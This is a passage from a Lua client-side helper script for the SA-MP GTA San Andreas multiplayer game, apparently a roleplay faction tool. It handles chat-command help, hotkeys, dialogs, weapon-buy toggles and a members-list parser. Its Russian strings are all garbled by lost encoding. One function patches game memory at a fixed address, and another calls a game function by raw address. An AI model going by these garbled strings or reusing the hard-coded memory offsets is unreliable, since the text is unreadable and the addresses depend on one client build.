		if sparams == config_ini.Commands[17] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[17] .. " [id/���] - ��������� ���������� ������ �� ������� � �� ����� ��", 0xFFFF0000) end
		if sparams == config_ini.Commands[18] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[18] .. " [load/unload/sdok/vdok] - ��������� ��������� �������� �� ���� ��������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}load - �������� �������� ���������; unload - �������� ��������� ���������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}sdok - ������ � ��������� ������ �� ������� ������������; vdok - ������ � ������/��������", 0xFFFF0000) end
		if sparams == config_ini.Commands[19] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[19] .. " [�����] - ������� SMS ���������� �����������", 0xFFFF0000) end
		if sparams == config_ini.Commands[20] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[20] .. " - �������������� /members 1 � ���������� ����� � ���� ������ � ���������� �����", 0xFFFF0000) end
		if sparams == config_ini.Commands[21] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[21] .. " [0-45] - ���������� ��������� ������", 0xFFFF0000) end
		if sparams == config_ini.Commands[22] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[22] .. " [0-23] - ���������� ��������� �����", 0xFFFF0000) end
		--if sparams == config_ini.Commands[23] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[23] .. "", 0xFFFF0000) end
		--if sparams == config_ini.Commands[24] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[24] .. "", 0xFFFF0000) end
		if sparams == config_ini.Commands[25] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[25] .. " - ����������� ����� AFK", 0xFFFF0000) end
		--if sparams == config_ini.Commands[26] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[26] .. "", 0xFFFF0000) end
		if sparams == config_ini.Commands[27] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[27] .. " ([id]) - ������� ���� ��������� � ���� � ���� �������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� ������� id �� ����, ����� ���������� �������� ����� ���������� ��������� � ���, ��� ������� ������ �� �����", 0xFFFF0000) end
		if sparams == config_ini.Commands[28] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[28] .. " ([id]) - �������� ������� (��� ��������� id) � �������������", 0xFFFF0000) end
		--if sparams == config_ini.Commands[29] then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[29] .. "", 0xFFFF0000) end
		if sparams == "commandhelp" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/commandhelp [�������/list] - �������� ���������� �� ������� ��� ������ ��������� ������", 0xFFFF0000) end
		if sparams == "bugreport" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/bugreport [�����] - ��������� ��������� �� ������ ��� ����������� �� ��������� �������", 0xFFFF0000) end
		if sparams == "dokhelp" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/dokhelp - �������� ���������� � �������� ��������� � ���������", 0xFFFF0000) end
		if sparams == "mkv" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/mkv [�������/clear - ��������] - ��������� ������ ���������� mkv", 0xFFFF0000) end
		if sparams == "bkv" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/bkv [�������/clear - ��������] - ��������� ������ ���������� bkv", 0xFFFF0000) end
		if sparams == "lej" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/lej - [id1 (id2) (id3)/clear - ��������] - ��������� ������ ���������� lej", 0xFFFF0000) end
		if sparams == "show" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/show - �������� ������� ���� �������", 0xFFFF0000) end
		if sparams == "bp" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/bp - �������� ��������� ������ ��� ���������� (�� ������)", 0xFFFF0000) end
end

function cmd_lej(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /lej [id1 (id2) (id3)/clear - ��������]", 0xFFFF0000) return end
		if sparams == "clear" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� lej ������� �������", 0xFFFF0000) lastID.e = "none" return end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� lej ������� ��������� �������� " .. sparams .. "", 0xFFFF0000) lastID.e = sparams return
end

function cmd_bkv(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /bkv [�������/clear - ��������]", 0xFFFF0000) return end
		if sparams == "clear" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� bkv ������� �������", 0xFFFF0000) lastKV.b = "none" return end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� bkv ������� ��������� �������� " .. sparams .. "", 0xFFFF0000) lastKV.b = sparams return
end

function cmd_mkv(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /mkv [�������/clear - ��������]", 0xFFFF0000) return end
		if sparams == "clear" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� mkv ������� �������", 0xFFFF0000) lastKV.m = "none" return end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� mkv ������� ��������� �������� " .. sparams .. "", 0xFFFF0000) lastKV.m = sparams return
end

function cmd_bp(sparams)
		if sparams ~= "deagle" and sparams ~= "shotgun"  and sparams ~= "smg" and sparams ~= "rifle" and sparams ~= "m4" and sparams ~= "par"  and sparams ~= "ot"  and sparams ~= "status" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /bp [deagle/shotgun/m4/smg/rifle/par/ot/status]", 0xFFFF0000) return end
		if sparams == "status" then
				local color = AutoDeagle and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}Desert eagle: {" .. color .. "}" .. tostring(AutoDeagle) .. "", 0xFFFF0000)
				local color = AutoShotgun and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}Shotgun: {" .. color .. "}" .. tostring(AutoShotgun) .. "", 0xFFFF0000)
				local color = AutoSMG and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}SMG: {" .. color .. "}" .. tostring(AutoSMG) .. "", 0xFFFF0000)
				local color = AutoRifle and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}Country Rifle: {" .. color .. "}" .. tostring(AutoRifle) .. "", 0xFFFF0000)
				local color = AutoM4A1 and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}M4A1: {" .. color .. "}" .. tostring(AutoM4A1) .. "", 0xFFFF0000)
				local color = AutoPar and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������: {" .. color .. "}" .. tostring(AutoPar) .. "", 0xFFFF0000)
				local color = AutoOt and "00FF00" or "FF0000"
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������: {" .. color .. "}" .. tostring(AutoOt) .. "", 0xFFFF0000)
		end

		if sparams == "deagle" then AutoDeagle = not AutoDeagle local color = AutoDeagle and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ Desert Eagle ���������� ��: {" .. color .. "}" .. tostring(AutoDeagle) .. "", 0xFFFF0000) end
		if sparams == "shotgun" then AutoShotgun = not AutoShotgun local color = AutoShotgun and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ Shotgun ���������� ��: {" .. color .. "}" .. tostring(AutoShotgun) .. "", 0xFFFF0000) end
		if sparams == "smg" then AutoSMG = not AutoSMG local color = AutoSMG and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ SMG ���������� ��: {" .. color .. "}" .. tostring(AutoSMG) .. "", 0xFFFF0000) end
		if sparams == "rifle" then AutoRifle = not AutoRifle local color = AutoRifle and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ Country Rifle ���������� ��: {" .. color .. "}" .. tostring(AutoRifle) .. "", 0xFFFF0000) end
		if sparams == "m4" then AutoM4A1 = not AutoM4A1 local color = AutoM4A1 and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ M4A1 ���������� ��: {" .. color .. "}" .. tostring(AutoM4A1) .. "", 0xFFFF0000) end
		if sparams == "par" then AutoPar = not AutoPar local color = AutoPar and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ �������� ���������� ��: {" .. color .. "}" .. tostring(AutoPar) .. "", 0xFFFF0000) end
		if sparams == "ot" then AutoOt = not AutoOt local color = AutoOt and "00FF00" or "FF0000" sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������� ���������� ��: {" .. color .. "}" .. tostring(AutoOt) .. "", 0xFFFF0000) end
end

function cmd_cars()
	 	if table.maxn(carsident) == 0 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ������� ������� �� �� �������� � ����������� ����������.", 0xFFFF0000) return end
		lua_thread.create(
				function()
						if not showdialog(0, "������ � �������������", "{FFFAFA}������ ������ ����� ��� ���������� ���������� � ������ ����������� ������ � ������� �� �������� �� ���� ���.\n���� ������ - ������ ���������� �������������� ���������� � �����-���� ������� ��� ������ ��� ������.\n���� ��� �������� ������ - ������� ����� � ������� ��� ��������� ��� ����� (��������: \"������ � ��\", ��� \"����� � ������������\").\n� ��������� ������ ���������� ������ � ������� ��� ������ ����������� (�������� \"�����������\"), ��� ������� \"������\" ���,\n����� ����������� ��� ������ ��� ��� �� ������ � ������� � � ������ � ���������� ����������.\n���� � ������ ��� �������� � �� ������ ������, �� ��� ��� ����� ���������� ������ ������ � ����� ������ ��� ID.\n��� ���� ����� �������� ������� �������� ������ � ����� ����� ������ \"��������\"\n��� ����, ����� ���������� ������� ������ (������� ��� ������������ ���������� ������ ��������� ������, � �� ������), �������� ������ ����� ������.", "����������") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						local res = waitForChooseInDialog(0)
						local tempdelarr = {}
						local result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
						local name = ""
						if result then name = sampGetPlayerNickname(id) end
						for k, v in pairs(carsident) do
								local driver = ""
								if v.drivername ~= "0" then
										driver = v.drivername
										local did = sampGetPlayerIdByNickname(driver)
										if did ~= nil then
												local clist = string.sub(string.format('%x', sampGetPlayerColor(did)), 3)
												local clist = clist == "ffff" and "fffafa" or clist
												driver = "{" .. clist .. "}" .. driver .. "[" .. tostring(did) .. "]{fffafa}"
										end
								else
										driver = "�����������"
								end

								if not showdialog(1, "�������������", "��� ������: " .. v.namecar .. "\nCID ������: " .. tostring(k) .. " (������, ���� CID > 1000 �� ������ ����� ��� ������/���������/����������� ������������ ������ � ������������ ��� �� ����������)\n���� ����������: " .. tostring(v.time) .. "\n��������: " .. driver .. "", "�����", "��������") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								local res = waitForChooseInDialog(1)
								if res == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ��� �������.", 0xFFFF0000) return end
								if res == "" then
										sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ���� ���������.", 0xFFFF0000)
								else
										sendtolog("ID ������: " .. tostring(k) .. ", �������: " .. res .. "", 0)
								end

								carsident[k] = nil
						end
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ��� ��������. ������� �� ��������������.", 0xFFFF0000)
				end
		)

end

--[[ function cmd_cars() -- ������� ������������
		 if table.maxn(carsident) == 0 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ������� ������� �� �� �������� � ����������� ����������.", 0xFFFF0000) return end
		 lua_thread.create(
				 function()
						 if not showdialog(0, "������ � �������������", "{FFFAFA}������ ������ ����� ��� ���������� ���������� � ������ ����������� ������ � ������� �� �������� �� ���� ���.\n���� ������ - ������ ���������� �������������� ���������� � �����-���� ������� ��� ������ ��� ������.\n���� ��� �������� ������ - ������� ����� � ������� ��� ��������� ��� ����� (��������: \"������ � ��\", ��� \"����� � ������������\").\n� ��������� ������ ���������� ������ � ������� ��� ������ ����������� (�������� \"�����������\"), ��� ������� \"������\" ���,\n����� ����������� ��� ������ ��� ��� �� ������ � 瘘������� � � ������ � ���������� ����������.\n���� � ������ ��� �������� � �� ������ ������, �� ��� ��� ����� ���������� ������ ������ � ����� ������ ��� ID.\n��� ���� ����� �������� ������� �������� ������ � ����� ����� ������ \"��������\"\n��� ����, ����� ���������� ������� ������ (������� ��� ������������ ���������� ������ ��������� ������, � �� ������), �������� ������ ����� ������.", "����������") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						 local res = waitForChooseInDialog(0)
						 local tempdelarr = {}
						 local result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
						 local name = ""
						 if result then name = sampGetPlayerNickname(id) end
						 if not showdialog(1, "�������������", "��� ������:", "�����", "��������") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						 local res = waitForChooseInDialog(1)
						 if res == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ��� �������.", 0xFFFF0000) return end
						 if res == "" then
							 sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ���� ���������.", 0xFFFF0000)
							 return
						 else
							 local str = ""
							 for k, v in pairs(carsident) do
								 wait(0)
								 str = str == "" and "[" .. tostring(k) .. "] = \"" .. res .. "\", " or "" .. str .. "[" .. tostring(k) .. "] = \"" .. res .. "\", "
								 sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����: id ������ " .. tostring(k) .. ", �������: " .. res .. ".", 0xFFFF0000)
							 end
							 sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ��� ��������. ������� �� ��������������.", 0xFFFF0000)
							 print(str)
							 str = ""
							 carsident = {}
						 end
				 end
		 )

end ]]

function formatbind(str)
		local str = tostring(str)
		local rarr = {}
		if str:match("@Hour@") then str = str:gsub("@Hour@", os.date("%H")) end
		if str:match("@Min@") then str = str:gsub("@Min@", os.date("%M")) end
		if str:match("@Sec@") then str = str:gsub("@Sec@", os.date("%S")) end
		if str:match("@Date@") then str = str:gsub("@Date@", os.date("%d.%m.%Y")) end
		if str:match("@KV@") then str = str:gsub("@KV@", kvadrat()) end
		if str:match("@MyID@") then str = str:gsub("@MyID@", tostring(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))) end
		if str:match("@clist@") then str = str:gsub("@clist@", config_ini.UserClist[clists[sampGetPlayerColor(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))]]) end
		if str:match("@enter@") then str = str:gsub("@enter@", "\n") end
		if str:match("@tid@") then if lastTargetID ~= -1 then str = str:gsub("@tid@", tostring(lastTargetID)) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ID ��������� ����.", 0xFFFF0000) return nil end end
		for v in str:gmatch('[^\n]+') do table.insert(rarr, v) end
		if rarr[1] == nil then rarr[1] = str end
		return rarr
end

function ismegaphone()
		if isCharOnFoot(PLAYER_PED) then return false end
		local carhandle = storeCarCharIsInNoSave(PLAYER_PED)-- ��������� handle ����������
		if carhandle < 0 then return false end
		local cid = select(2, sampGetVehicleIdByCarHandle(carhandle))
		if cIDs[cid] ~= nil and (cIDs[cid] == "����� ��" or cIDs[cid] == "����� ��" or cIDs[cid] == "������� �����������" or cIDs[cid] == "������� ��" or cIDs[cid] == "������� ��" or cIDs[cid] == "������� ��" or cIDs[cid] == "FBI" or cIDs[cid] == "���� ��" or cIDs[cid] == "�.�.�.�.") then return true end
		return false
end


function string.split(str, delim, plain) -- bh FYP
   local tokens, pos, plain = {}, 1, not (plain == false) --[[ delimiter is plain text by default ]]
   repeat
       local npos, epos = string.find(str, delim, pos, plain)
       table.insert(tokens, string.sub(str, pos, npos and npos - 1))
       pos = epos and epos + 1
   until not pos
   return tokens
end

function strunsplit(str, delim)
   local str = string.split(str, " ")
   local estr = {[1] = ""}
   local A_Index = 1
   for k, i in ipairs(str) do
        if #estr[A_Index] + #i > delim then A_Index = A_Index + 1 estr[A_Index] = "" end    
        estr[A_Index] = estr[A_Index] == "" and i or "" .. estr[A_Index] .. " " .. i .. "" 
   end
    
   return estr
end

function imgui.Hotkey(name, numkey, width)
		imgui.BeginChild(name, imgui.ImVec2(width, 30), true)
		imgui.PushItemWidth(width)

		local hstr = ""
		for _, v in ipairs(string.split(config_ini.HotKey[numkey], ", ")) do
				if v ~= "0" then
						hstr = hstr == "" and tostring(vkeys.id_to_name(tonumber(v))) or "" .. hstr .. " + " .. tostring(vkeys.id_to_name(tonumber(v))) .. ""
				end
		end
		hstr = (hstr == "" or hstr == "nil") and "���" or hstr

		imgui.Text(u8(hstr))
		imgui.PopItemWidth()
		imgui.EndChild()
		if imgui.IsItemClicked() then
				lua_thread.create(
						function()
							local curkeys = ""
							local tbool = false
							while true do
									wait(0)
									if not tbool then
											for k, v in pairs(vkeys) do
													sv = tostring(v)
													if isKeyDown(v) and (v == vkeys.VK_MENU or v == vkeys.VK_CONTROL or v == vkeys.VK_SHIFT or v == vkeys.VK_LMENU or v == vkeys.VK_RMENU or v == vkeys.VK_RCONTROL or v == vkeys.VK_LCONTROL or v == vkeys.VK_LSHIFT or v == vkeys.VK_RSHIFT) then
															if v ~= vkeys.VK_MENU and v ~= vkeys.VK_CONTROL and v ~= vkeys.VK_SHIFT then
																	if not curkeys:find(sv) then
																			curkeys = tostring(curkeys):len() == 0 and sv or curkeys .. " " .. sv
																	end
															end
													end
											end

											for k, v in pairs(vkeys) do
													sv = tostring(v)
													if isKeyDown(v) and (v ~= vkeys.VK_MENU and v ~= vkeys.VK_CONTROL and v ~= vkeys.VK_SHIFT and v ~= vkeys.VK_LMENU and v ~= vkeys.VK_RMENU and v ~= vkeys.VK_RCONTROL and v ~= vkeys.VK_LCONTROL and v ~= vkeys.VK_LSHIFT and v ~=vkeys. VK_RSHIFT) then
														 	if not curkeys:find(sv) then
																	curkeys = tostring(curkeys):len() == 0 and sv or curkeys .. " " .. sv
																	tbool = true
															end
													end
											end
									else
											tbool2 = false
											for k, v in pairs(vkeys) do
													sv = tostring(v)
													if isKeyDown(v) and (v ~= vkeys.VK_MENU and v ~= vkeys.VK_CONTROL and v ~= vkeys.VK_SHIFT and v ~= vkeys.VK_LMENU and v ~= vkeys.VK_RMENU and v ~= vkeys.VK_RCONTROL and v ~= vkeys.VK_LCONTROL and v ~= vkeys.VK_LSHIFT and v ~=vkeys. VK_RSHIFT) then
															tbool2 = true
															if not curkeys:find(sv) then
																	curkeys = tostring(curkeys):len() == 0 and sv or curkeys .. " " .. sv
															end
													end
											end

											if not tbool2 then break end
									end
							end

							local keys = ""
							if tonumber(curkeys) == vkeys.VK_BACK then
									config_ini.HotKey[numkey] = "0"
							else
									local tNames = string.split(curkeys, " ")
									for _, v in ipairs(tNames) do
											local val = (tonumber(v) == 162 or tonumber(v) == 163) and 17 or (tonumber(v) == 160 or tonumber(v) == 161) and 16 or (tonumber(v) == 164 or tonumber(v) == 165) and 18 or tonumber(v)
											keys = keys == "" and val or "" .. keys .. ", " .. val .. ""
									end
							end

							config_ini.HotKey[numkey] = keys
						end
				)
		end
end

function makeHotKey(numkey)
		local rett = {}
		for _, v in ipairs(string.split(config_ini.HotKey[numkey], ", ")) do
				if tonumber(v) ~= 0 then table.insert(rett, tonumber(v)) end
		end
		return rett
end

function showdialog(style, title, text, button1, button2)
		if isDialogActiveNow then return false end
		sampShowDialog(9048, title, text, button1, button2, style)
	 	isDialogActiveNow = true
		return true
end

function getMembersText()
		refmem1.status, refmem1.text = true, ""
		sampSendChat("/members 1")
		while refmem1.text == "" do wait(0) end
		local Members1Text = refmem1.text
		refmem1.status, refmem1.text = false, ""

		local temparr = {}
		local delarr = {}
		if memb_ini.players == nil then memb_ini.players = {} end
		
		for v in Members1Text:gmatch('[^\n]+') do 
			local id, name, zv, rank = v:match("%[%d+%] %[(%d+)%] ([%a_]+)	(%W*) %[(%d+)%].*") 
			if zv ~= nil then 
				temparr[name] = zv
				memb_ini.players[name] = zv 
			end 
		end -- ��������� ������� ������� �� ��������� ������
		
		for k, v in pairs(memb_ini.players) do if temparr[k] == nil and sampGetPlayerIdByNickname(k) ~= nil then table.insert(delarr, k) end end -- ��������� ������� ��� � ������� ���, ��� ������ �� � members � ������ ��� ����
		
		for i = 0, 1000 do if sampIs3dTextDefined(2048 - i) then sampDestroy3dText(2048 - i) end end
		
		for k, v in ipairs(delarr) do memb_ini.players[v] = nil end -- ������� � ��� ���� ��� �� � ��� ���
		
		inicfg.save(memb_ini, "members")
		return Members1Text
end

function waitForChooseInDialog(style)
		if style ~= 0 and style ~= 1 and style ~= 2 then return nil end
		while sampIsDialogActive(9048) do wait(100) end
		local result, button, list, input = sampHasDialogRespond(9048)
		returnWalue = style == 1 and input or list
		isDialogActiveNow = false
		if style == 0 or button == 0 then return nil end
		return returnWalue
end

function sampGetPlayerIdByNickname(nick)
		local _, myid = sampGetPlayerIdByCharHandle(playerPed)
    if tostring(nick) == sampGetPlayerNickname(myid) then return myid end
    for i = 0, 1000 do if sampIsPlayerConnected(i) and sampGetPlayerNickname(i) == tostring(nick) then return i end end
end

function sampGetPlayerSkin(id)
    if not id or not sampIsPlayerConnected(tonumber(id)) and not tonumber(id) == select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) then return false end -- ��������� ��������
    local isLocalPlayer = tonumber(id) == select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) -- ���������, �������� �� ���� ��������� �������
    local result, handle = sampGetCharHandleBySampPlayerId(tonumber(id)) -- �������� CharHandle �� SAMP-ID
    local result, handle = sampGetCharHandleBySampPlayerId(tonumber(id)) -- �������� CharHandle �� SAMP-ID
    if not result and not isLocalPlayer then return false end -- ���������, ������� �� ��� CharHandle
    local skinid = getCharModel(isLocalPlayer and PLAYER_PED or handle) -- �������� ���� ������ CharHandle
    if skinid < 0 or skinid > 311 then return false end -- ��������� ���������� ������ �����, ������ ID ������������ ������ SAMP
    return true, skinid -- ���������� ������ � ID �����
end

function imgui.CenterTextColoredRGB(text)
    local width = imgui.GetWindowWidth()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local ImVec4 = imgui.ImVec4

    local explode_argb = function(argb)
        local a = bit.band(bit.rshift(argb, 24), 0xFF)
        local r = bit.band(bit.rshift(argb, 16), 0xFF)
        local g = bit.band(bit.rshift(argb, 8), 0xFF)
        local b = bit.band(argb, 0xFF)
        return a, r, g, b
    end

    local getcolor = function(color)
        if color:sub(1, 6):upper() == 'SSSSSS' then
            local r, g, b = colors[1].x, colors[1].y, colors[1].z
            local a = tonumber(color:sub(7, 8), 16) or colors[1].w * 255
            return ImVec4(r, g, b, a / 255)
        end
        local color = type(color) == 'string' and tonumber(color, 16) or color
        if type(color) ~= 'number' then return end
        local r, g, b, a = explode_argb(color)
        return imgui.ImColor(r, g, b, a):GetVec4()
    end

    local render_text = function(text_)
        for w in text_:gmatch('[^\r\n]+') do
            local textsize = w:gsub('{.-}', '')
            local text_width = imgui.CalcTextSize(u8(textsize))
            imgui.SetCursorPosX( width / 2 - text_width .x / 2 )
            local text, colors_, m = {}, {}, 1
            w = w:gsub('{(......)}', '{%1FF}')
            while w:find('{........}') do
                local n, k = w:find('{........}')
                local color = getcolor(w:sub(n + 1, k - 1))
                if color then
                    text[#text], text[#text + 1] = w:sub(m, n - 1), w:sub(k + 1, #w)
                    colors_[#colors_ + 1] = color
                    m = n
                end
                w = w:sub(1, n - 1) .. w:sub(k + 1, #w)
            end
            if text[0] then
                for i = 0, #text do
                    imgui.TextColored(colors_[i] or colors[1], u8(text[i]))
                    imgui.SameLine(nil, 0)
                end
                imgui.NewLine()
            else
                imgui.Text(u8(w))
            end
        end
    end
    render_text(text)
end

function imgui.TextColoredRGB(text)
	    local style = imgui.GetStyle()
	    local colors = style.Colors
	    local ImVec4 = imgui.ImVec4

	    local explode_argb = function(argb)
		        local a = bit.band(bit.rshift(argb, 24), 0xFF)
		        local r = bit.band(bit.rshift(argb, 16), 0xFF)
		        local g = bit.band(bit.rshift(argb, 8), 0xFF)
		        local b = bit.band(argb, 0xFF)
		        return a, r, g, b
	    end

	    local getcolor = function(color)
		        if color:sub(1, 6):upper() == 'SSSSSS' then
			            local r, g, b = colors[1].x, colors[1].y, colors[1].z
			            local a = tonumber(color:sub(7, 8), 16) or colors[1].w * 255
			            return ImVec4(r, g, b, a / 255)
		        end

		        local color = type(color) == 'string' and tonumber(color, 16) or color
		        if type(color) ~= 'number' then return end
		        local r, g, b, a = explode_argb(color)
		        return imgui.ImColor(r, g, b, a):GetVec4()
	    end

	    local render_text = function(text_)
				  for w in text_:gmatch('[^\r\n]+') do
				 			local text, colors_, m = {}, {}, 1
						  w = w:gsub('{(......)}', '{%1FF}')
						  while w:find('{........}') do
								  local n, k = w:find('{........}')
								  local color = getcolor(w:sub(n + 1, k - 1))
								  if color then
										  text[#text], text[#text + 1] = w:sub(m, n - 1), w:sub(k + 1, #w)
										  colors_[#colors_ + 1] = color
										  m = n
								  end

				  				w = w:sub(1, n - 1) .. w:sub(k + 1, #w)
				  		end

						  if text[0] then
						  		for i = 0, #text do
										  imgui.TextColored(colors_[i] or colors[1], u8(text[i]))
											if imgui.IsItemClicked() then	if SelectedRow == A_Index then ChoosenRow = SelectedRow	else	SelectedRow = A_Index	end	end
											imgui.SameLine(nil, 0)
				  				end

									imgui.NewLine()
				  		else
									imgui.Text(u8(w))
									if imgui.IsItemClicked() then	if SelectedRow == A_Index then ChoosenRow = SelectedRow	else	SelectedRow = A_Index	end	end
							end
				  end
	    end
	    render_text(text)
end

function patch_samp_time_set(enable)
		if enable and default == nil then
				default = readMemory(sampGetBase() + 0x9C0A0, 4, true)
				writeMemory(sampGetBase() + 0x9C0A0, 4, 0x000008C2, true)
		elseif enable == false and default ~= nil then
				writeMemory(sampGetBase() + 0x9C0A0, 4, default, true)
				default = nil
		end
end

function kvadrat()
    local KV = {
        [1] = "�",
        [2] = "�",
        [3] = "�",
        [4] = "�",
        [5] = "�",
        [6] = "�",
        [7] = "�",
        [8] = "�",
        [9] = "�",
        [10] = "�",
        [11] = "�",
        [12] = "�",
        [13] = "�",
        [14] = "�",
        [15] = "�",
        [16] = "�",
        [17] = "�",
        [18] = "�",
        [19] = "�",
        [20] = "�",
        [21] = "�",
        [22] = "�",
        [23] = "�",
        [24] = "�",
    }
    local X, Y, Z = getCharCoordinates(playerPed)
    X = math.ceil((X + 3000) / 250)
    Y = math.ceil((Y * - 1 + 3000) / 250)
    Y = KV[Y]
    local KVX = (Y.."-"..X)
    return KVX
end

function drawPieSub(v)
  if pie.BeginPieMenu(u8(v.name)) then
    for i, l in ipairs(v.next) do
      if l.next == nil then
        if pie.PieMenuItem(u8(l.name)) then l.action() end
      elseif type(l.next) == 'table' then
        drawPieSub(l)
      end
    end
    pie.EndPieMenu()
  end
end

function get_crosshair_position()
    local vec_out = ffi.new("float[3]")
    local tmp_vec = ffi.new("float[3]")
    ffi.cast(
        "void (__thiscall*)(void*, float, float, float, float, float*, float*)",
        0x514970
    )(
        ffi.cast("void*", 0xB6F028),
        15.0,
        tmp_vec[0], tmp_vec[1], tmp_vec[2],
        tmp_vec,
        vec_out
    )
    return vec_out[0], vec_out[1], vec_out[2]
end

function getAngle(x, y) -- �������� ���� ����� ���������� � ��������� ������ �� ������� ���������
		local myX, myY, myZ = getCharCoordinates(PLAYER_PED)
		local crsX, crsY, crsZ = convertScreenCoordsToWorld3D(sx, sy, 700.0)
		local a = math.sqrt(((x-crsX)^2) + ((y-crsY)^2)) -- ��������� ����� ��������� ������ � ������ ���� ��������� ������
		local b = math.sqrt(((myX-x)^2) + ((myY-y)^2)) -- ���������� ����� ������������ ��������� � ��������� ������
		local c = math.sqrt(((crsX-myX)^2) + ((crsY-myY)^2)) -- ���������� ����� ������������ ��������� � ������ ���� ��������� �����
		local cosA = ((b*b) + (c*c) - (a*a))/(2*b*c) -- �������� ������� ����
		local radA = math.acos(cosA) -- �������� �������� ���� � �������� ����� ����������
		local deg = math.deg(radA) -- ���� � ��������

		-- ���������� ��� ������ ������� ����� ������� �� ������������ ������
		--local rad = math.atan2((x - myX), (y - myY))
		--local deg = math.deg(rad)
		--return deg


		-- ����� �� ��������
		local myAngle = 360 - getCharHeading(PLAYER_PED)
		if (myAngle >= 0 and myAngle <= 90) and (x <= myX or y >= myY) then return -1 * deg end
		if (myAngle > 90 and myAngle <= 180) and (x >= myX or y >= myY) then return -1 * deg end
		if (myAngle > 180 and myAngle <= 270) and (x >= myX or y <= myY) then return -1 * deg end
		if (myAngle > 270 and myAngle <= 360) and (x <= myX or y <= myY) then return -1 * deg end
		return deg

		-- ����� ��������� ������������ - ����� �� ������� � ����� �� �� ��������
		-- local vec_a = {["x"] = crsX - myX, ["y"] = crsY - myY, ["z"] = crsZ - myZ}
